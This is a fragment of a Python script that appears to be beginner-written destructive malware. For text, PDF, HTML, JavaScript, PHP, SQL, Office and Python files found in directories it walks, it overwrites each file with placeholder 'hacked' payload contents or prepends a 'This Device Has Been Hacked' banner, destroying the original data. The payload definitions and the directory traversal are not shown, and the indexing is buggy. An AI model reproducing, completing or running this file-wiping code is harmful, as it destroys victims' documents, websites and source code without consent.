def findTXT():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredTXT = fnmatch.filter(filesInsideDir, '*.txt')
    if len(filteredTXT) > 0:
        for k in range(len(filteredTXT)):
            pathsToTXT.append(dirNameOfDir + "\\" + filteredTXT[k - 1])
        populateTXT()
def populateTXT():
    for l in range(len(pathsToTXT)):
        TXTFile = open(pathsToTXT[l - 1], "r")
        TXTFileContents = str(TXTFile.read())
        TXTFile.close()
        TXTFile = open(pathsToTXT[l - 1], "w")
        TXTFile.write("Hello!!\nThis Device Has Been Hacked By A Beginner Python Script!!\n\n\n\n\n" + TXTFileContents)
        TXTFile.close()

def findPDF():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredPDF = fnmatch.filter(filesInsideDir, '*.pdf')
    if len(filteredPDF) > 0:
        for k in range(len(filteredPDF)):
            pathsToPDF.append(dirNameOfDir + "\\" + filteredPDF[k - 1])
        populatePDF()
def populatePDF():
    for l in range(len(pathsToPDF)):
        PDFFile = open(pathsToPDF[l - 1], "wb")
        PDFFile.write(pdfHackedCode)
        PDFFile.close()

def findHTML():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredHTML = fnmatch.filter(filesInsideDir, '*.html')
    filteredHTML.extend(fnmatch.filter(filesInsideDir, '*.htm'))
    filteredHTML.extend(fnmatch.filter(filesInsideDir, '*.xhtml'))
    if len(filteredHTML) > 0:
        for k in range(len(filteredHTML)):
            pathsToHTML.append(dirNameOfDir + "\\" + filteredHTML[k - 1])
        populateHTML()
def populateHTML():
    for l in range(len(pathsToHTML)):
        HTMLFile = open(pathsToHTML[l - 1], "w")
        HTMLFile.write(htmlHackedCode)
        HTMLFile.close()

def findXML():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredXML = fnmatch.filter(filesInsideDir, '*.xml')
    if len(filteredXML) > 0:
        for k in range(len(filteredXML)):
            pathsToXML.append(dirNameOfDir + "\\" + filteredXML[k - 1])
        populateXML()
def populateXML():
    for l in range(len(pathsToXML)):
        XMLFile = open(pathsToXML[l - 1], "w")
        XMLFile.write(xmlHackedCode)
        XMLFile.close()

def findXSL():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredXSL = fnmatch.filter(filesInsideDir, '*.xsl')
    if len(filteredXSL) > 0:
        for k in range(len(filteredXSL)):
            pathsToXSL.append(dirNameOfDir + "\\" + filteredXSL[k - 1])
        populateXSL()
def populateXSL():
    for l in range(len(pathsToXSL)):
        XSLFile = open(pathsToXSL[l - 1], "w")
        XSLFile.write(xslHackedCode)
        XSLFile.close()

def findCSS():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredCSS = fnmatch.filter(filesInsideDir, '*.css')
    if len(filteredCSS) > 0:
        for k in range(len(filteredCSS)):
            pathsToCSS.append(dirNameOfDir + "\\" + filteredCSS[k - 1])
        populateCSS()
def populateCSS():
    for l in range(len(pathsToCSS)):
        CSSFile = open(pathsToCSS[l - 1], "w")
        CSSFile.write(cssHackedCode)
        CSSFile.close()

def findJS():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredJS = fnmatch.filter(filesInsideDir, '*.js')
    if len(filteredJS) > 0:
        for k in range(len(filteredJS)):
            pathsToJS.append(dirNameOfDir + "\\" + filteredJS[k - 1])
        populateJS()
def populateJS():
    for l in range(len(pathsToJS)):
        JSFile = open(pathsToJS[l - 1], "w")
        JSFile.write(jsHackedCode)
        JSFile.close()

def findPHP():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredPHP = fnmatch.filter(filesInsideDir, '*.php')
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.phtml'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php3'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php4'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php5'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php7'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.phps'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php-s'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.pht'))
    if len(filteredPHP) > 0:
        for k in range(len(filteredPHP)):
            pathsToPHP.append(dirNameOfDir + "\\" + filteredPHP[k - 1])
        populatePHP()
def populatePHP():
    for l in range(len(pathsToPHP)):
        PHPFile = open(pathsToPHP[l - 1], "w")
        PHPFile.write(phpHackedCode)
        PHPFile.close()

def findSQL():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredSQL = fnmatch.filter(filesInsideDir, '*.sql')
    if len(filteredSQL) > 0:
        for k in range(len(filteredSQL)):
            pathsToSQL.append(dirNameOfDir + "\\" + filteredSQL[k - 1])
        populateSQL()
def populateSQL():
    for l in range(len(pathsToSQL)):
        SQLFile = open(pathsToSQL[l - 1], "w")
        SQLFile.write(sqlHackedCode)
        SQLFile.close()

# Microsoft Office File Types

def findACCDB():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredACCDB = fnmatch.filter(filesInsideDir, '*.accdb')
    filteredACCDB.extend(fnmatch.filter(filesInsideDir, '*.mdb'))
    if len(filteredACCDB) > 0:
        for k in range(len(filteredACCDB)):
            pathsToACCDB.append(dirNameOfDir + "\\" + filteredACCDB[k - 1])
        populateACCDB()
def populateACCDB():
    for l in range(len(pathsToACCDB)):
        ACCDBFile = open(pathsToACCDB[l - 1], "wb")
        ACCDBFile.write(accdbHackedCode)
        ACCDBFile.close()

def findXLSX():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredXLSX = fnmatch.filter(filesInsideDir, '*.xlsx')
    filteredXLSX.extend(fnmatch.filter(filesInsideDir, '*.xls'))
    if len(filteredXLSX) > 0:
        for k in range(len(filteredXLSX)):
            pathsToXLSX.append(dirNameOfDir + "\\" + filteredXLSX[k - 1])
        populateXLSX()
def populateXLSX():
    for l in range(len(pathsToXLSX)):
        XLSXFile = open(pathsToXLSX[l - 1], "wb")
        XLSXFile.write(xlsxHackedCode)
        XLSXFile.close()

def findPPTX():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredPPTX = fnmatch.filter(filesInsideDir, '*.pptx')
    filteredPPTX.extend(fnmatch.filter(filesInsideDir, '*.ppt'))
    if len(filteredPPTX) > 0:
        for k in range(len(filteredPPTX)):
            pathsToPPTX.append(dirNameOfDir + "\\" + filteredPPTX[k - 1])
        populatePPTX()
def populatePPTX():
    for l in range(len(pathsToPPTX)):
        PPTXFile = open(pathsToPPTX[l - 1], "wb")
        PPTXFile.write(pptxHackedCode)
        PPTXFile.close()

def findDOCX():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredDOCX = fnmatch.filter(filesInsideDir, '*.docx')
    filteredDOCX.extend(fnmatch.filter(filesInsideDir, '*.doc'))
    if len(filteredDOCX) > 0:
        for k in range(len(filteredDOCX)):
            pathsToDOCX.append(dirNameOfDir + "\\" + filteredDOCX[k - 1])
        populateDOCX()
def populateDOCX():
    for l in range(len(pathsToDOCX)):
        DOCXFile = open(pathsToDOCX[l - 1], "wb")
        DOCXFile.write(docxHackedCode)
        DOCXFile.close()

def findRTF():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredRTF = fnmatch.filter(filesInsideDir, '*.rtf')
    if len(filteredRTF) > 0:
        for k in range(len(filteredRTF)):
            pathsToRTF.append(dirNameOfDir + "\\" + filteredRTF[k - 1])
        populateRTF()
def populateRTF():
    for l in range(len(pathsToRTF)):
        RTFFile = open(pathsToRTF[l - 1], "wb")
        RTFFile.write(rtfHackedCode)
        RTFFile.close()

def findPY():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredPY = fnmatch.filter(filesInsideDir, '*.py')
    if len(filteredPY) > 0:
        for k in range(len(filteredPY)):
            pathsToPY.append(dirNameOfDir + "\\" + filteredPY[k - 1])
        populatePY()
def populatePY():
    for l in range(len(pathsToPY)):
        PYFile = open(pathsToPY[l - 1], "w")
        PYFile.write(pyHackedCode)
        PYFile.close()

# More Computer Based Languages
"""
def findC(*directories):
    availDirs = []
    for i in directories:
        availDirs.append(i)
    filteredC = fnmatch.filter(availDirs, '*.c')
def findCS(*directories):
    availDirs = []
    for i in directories:
        availDirs.append(i)
    filteredCS = fnmatch.filter(availDirs, '*.cs')
def findCPP(*directories):
    availDirs = []
    for i in directories:
        availDirs.append(i)
    filteredCPP = fnmatch.filter(availDirs, '*.cpp')
def findH(*directories):
"""

